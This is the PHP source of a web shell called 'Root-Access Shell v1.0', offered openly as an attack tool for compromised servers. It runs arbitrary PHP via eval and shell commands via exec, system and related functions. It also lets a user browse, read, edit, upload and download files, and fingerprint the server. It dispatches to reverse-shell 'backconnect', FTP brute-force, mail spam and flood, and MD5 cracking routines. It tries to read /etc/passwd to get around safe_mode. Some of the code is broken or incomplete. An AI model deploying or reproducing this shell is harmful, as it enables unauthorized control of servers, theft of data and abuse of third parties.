<?php
ini_set("session.gc_maxlifetime",1);
session_start();
error_reporting(0);
safe_mode();
if($_POST['type']==11){download(stripslashes($_POST['value']));};
function download($dfilename)
{
$file=fopen($dfilename,"r");
ob_clean();
$filename = basename($dfilename);
$filedump = fread($file,@filesize($dfilename));
fclose($file);
header("Content-type: ".$mime_type);
header("Content-disposition: attachment; filename=\"".$filename."\";");
echo $filedump;
}
function testperl()
{
if(ex('perl -h'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function view_size($size)
{
if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
else {$size = $size . " B";}
return $size;
}
function testfetch()
{
if(ex('fetch --help'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function testwget()
{
if(ex('wget --help'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function oracle()
{
if(function_exists('ocilogon'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function postgresql()
{
if(function_exists('pg_connect'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function testmssql()
{
if(function_exists('mssql_connect'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function testcurl()
{
if(function_exists('curl_version'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function testmysql()
{
if(function_exists('mysql_connect'))
{
return "<font size=2 color=#29a329>ON</font>";
}else{
return "<font size=2 color=#ff4500>OFF</font>";
}
}
function safe_mode()
{
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3)
{
$_SESSION['safe_mode'] = 1;
return "<font size=2 color=#29a329>ON</font>";
}else{
$_SESSION['safe_mode'] = 0;
return "<font size=2 color=#ff4500>OFF</font>";
}
};
function ex($in)
{
$out = '';
if(function_exists('exec'))
{
exec($in,$out);
$out = join("\n",$out);
}
elseif(function_exists('passthru'))
{
ob_start();
passthru($in);
$out = ob_get_contents();
ob_end_clean();
}
elseif(function_exists('system'))
{
ob_start();
system($in);
$out = ob_get_contents();
ob_end_clean();
}
elseif(function_exists('shell_exec'))
{
$out = shell_exec($in);
}
elseif(is_resource($f = popen($in,"r")))
{
$out = "";
while(!@feof($f)) { $out .= fread($f,1024); }
pclose($f);
}
return $out;
}

function shell()
{
if($_POST['type']==1)
{
eval(stripslashes($_POST['value']));
}
elseif($_POST['type']==2)
{
pwd();
print_r(ex(stripslashes($_POST['value'])));
}
elseif($_POST['type']==3)
{
if($_SESSION['safe_mode'] == 1){
if(($u=safe_ex('ls -la'))!='')
{return $u;}else{return safe_ex('dir');};

}else{
if(($u=ex('ls -la'))!='')
{return $u;}else{return ex('dir');};
}
}
elseif($_POST['type']==4)
{
if(file_exists(stripslashes($_POST['value'])))
{
if($safe_mode!=1){
echo htmlspecialchars(fread(fopen(stripslashes($_POST['value']),"rw"),filesize(stripslashes($_POST['value']))));
}else{
echo htmlspecialchars(safe_read(stripslashes($_POST['value'])));
};
$_SESSION['edit']=1;
$_SESSION['filename'] = $_POST['value'];
}else{
return 'File doesn\'t exists!';
}
}
elseif($_POST['type']==5)
{
fputs(fopen($_SESSION['filename'],"w"),stripslashes($_POST['value']));
}
elseif($_POST['type']==6)
{
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
}
elseif($_POST['type']==7)
{
echo alias($_POST['value']);
}
elseif($_POST['type']==8)
{
echo spammer(stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['check']),stripslashes($_POST['elist']),stripslashes($_POST['logf']));
}
elseif($_POST['type']==9)
{
echo ftp_brute(stripslashes($_POST['host']),stripslashes($_POST['users']),stripslashes($_POST['passwd']),stripslashes($_POST['log']));
}
elseif($_POST['type']==10)
{
echo flooder(stripslashes($_POST['log']),stripslashes($_POST['to']),stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['amount']),stripslashes($_POST['check']));
}
elseif($_POST['type']==12)
{
echo backconnect(stripslashes($_POST['ip']),stripslashes($_POST['port']),stripslashes($_POST['method']));
}
elseif($_POST['type']==13)
{
echo backconnect(stripslashes($_POST['port']),stripslashes($_POST['pass']),stripslashes($_POST['method']));
}
elseif($_POST['type']==14)
{
echo md5_brute(stripslashes($_POST['hash']),stripslashes($_POST['log']),stripslashes($_POST['dict']));
}
else
{$u = ex('ls -la');
if($u == ''){return ex('dir');}else{return $u;};
}
return null;
};
function edit()
{
if ($_SESSION['edit'] == 1){
$_SESSION['edit']=0;
return "<br><center><input type=submit value=\"Save\"></center>";};
}
function getsystem()
{
return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};
function getserver()
{
return getenv("SERVER_SOFTWARE");
};
function getuser()
{
$out = get_current_user();
if($out!="SYSTEM")
{
if(($out=ex('id'))==''){$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();};
}
return $out;
};
function pwd()
{
if($_POST['type']==3)
{
$_SESSION['pwd'] = stripslashes($_POST['value']);
}
chdir($_SESSION['pwd']);
$cwd = getcwd();
if($u=strrpos($cwd,'/'))
{
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\'))
{
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
function safe_ex($in)
{
if($in){
$d=dir('.');
while (false!==($file=$d->read()))
{
if ($file=="." || $file=="..") continue;
@clearstatcache();
list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
if(!$unix){
echo date("d.m.Y H:i",$mtime)." ";
if(@is_dir($file)) echo " <DIR> "; else printf("% 7s ",$size);
}
else{
$owner = @posix_getpwuid($uid);
$grgid = @posix_getgrgid($gid);
echo $inode." ";
echo perms(@fileperms($file));
printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
echo date("d.m.Y H:i ",$mtime);
}
echo "$file\n";
}
$d->close();
}
function safe_read($in)
{
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include("/etc/passwd");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
file_get_contents($in);
}
}
?><html>
<head>
<title>Root-Access Shell</title>
<META http-equiv="Content-Type" content="text/html; charset=CP866">
<style type=text/css>
BODY { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 11px;margin: 0px;padding: 0px;text-align: center;color: #e7e7eb;background-color: #242629;}
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 12px;color: #e7e7eb;}
.contentb {background-color: #44474f;}
.t { padding: 6px;background-color: #242629;}
input,textarea,select
{background: #44474f;
border: 1px solid #242629;
color: #e7e7eb;
font-family: verdana, helvetica, sans-serif;
font-size: 11px;
margin: 5px;
padding: 2px;
vertical-align: middle;
}
</style>
</head>
<body bgcolor='#242629'><br>
<center>

<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Server Info</b></th></tr>
<tr><td class=contentb>
<table border="0" width="100%"><tr>
<td width="35%" >System: <font size=2 color=#ff4500><b><?php echo getsystem();?></b></font></td>
<td width="15%" >PHP-version: <font size=2 color=#29a329><?php echo phpversion();?></font></td>
<td width="15%" >Oracle: <?php echo oracle();?></td>
<td width="25%" >Safe_mode: <?php echo safe_mode();?></td>
</tr>
<tr>
<td width="35%" >Server: <font size=2 color=#ff4500><b><?php echo getserver();?></b></font></td>
<td width="15%" >MySQL: <?php echo testmysql();?></td>
<td width="15%" >cURL: <?php echo testcurl();?></td>
<td width="25%" >Total space: <?php echo view_size(disk_total_space(getcwd()));?></td>
</tr>
<tr>
<td width="35%" >PWD: <font size=2 color=#ff4500><b><?php if(strlen($u=pwd())>45){echo "...".substr($u,strlen($u)-40,40);}else{echo $u;};?></b></font></td>
<td width="15%" >PostgreSQL: <?php echo postgresql();?></td>
<td width="15%" >WGet: <?php echo testwget();?></td>
<td width="25%" >Free space: <?php echo view_size(diskfreespace(getcwd()));?></td>
</tr>
<tr>
<td width="35%" >User: <font size=2 color=#ff4500><b><?php echo getuser();?></b></font></td>
<td width="15%" >MSSQL: <?php echo testmssql();?></td>
<td width="15%" >Perl: <?php echo testperl();?></td>
<td width="25%" >Server time: <?php echo date('H:i d-m-Y');?></td>
</tr>
</table>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Shell</b></th></tr>
<tr><td class=contentb><center>
<form action method=POST>
<input type=hidden name="type" value=5>
<textarea cols=150 rows=20 name="value">
<?php echo htmlspecialchars(shell());?>
</textarea><?php echo edit();?></form>
<table border="0" width="100%">
<tr>
<td width="50%" align="center"><form action method=POST>
<b>Enter comand:</b>
<input type=hidden name="type" value=2>
<input type=text name="value" size=45><input type=submit value="Enter">
</form></td>
<td width="50%" align="center"><form action method=POST><b>PWD:</b> <input type=text name="value" size=51 value=<?php echo pwd();?>><input type=hidden name="type" value=3><input type=submit value="Enter">
</form></td>
</tr>
</table>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Tools</b></th></tr>
<tr><td class=contentb>
<form action method=POST>
<b>Edit file:</b><input type=hidden name="type" value=4>
<input type=text name="value" size=72 value=<?php echo pwd();?>><input type=submit value="Edit">
</form>
<form action method=POST>
<b>Download:</b>
<input type=hidden name="type" value=11><input type=text name="value" size=71 value=<?php echo pwd();?>><input type=submit value="Download">
</form><form enctype="multipart/form-data" action method=POST>
<b>Upload:</b><input type=hidden name="type" value=6>
<input type=file name="userfile" size=28>
<input type=hidden name="type" value=6>New name:<input type=text size=35 name="newname"><input type=submit value="Upload">
</form>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Copyright</b></th></tr>
<tr><td class=contentb><center><a href="http://forum.root-access.ru"><font size=2 color=#e7e7eb>Root-Access Shell v1.0</font></a></center>
</td></tr></table><br></center></body></html>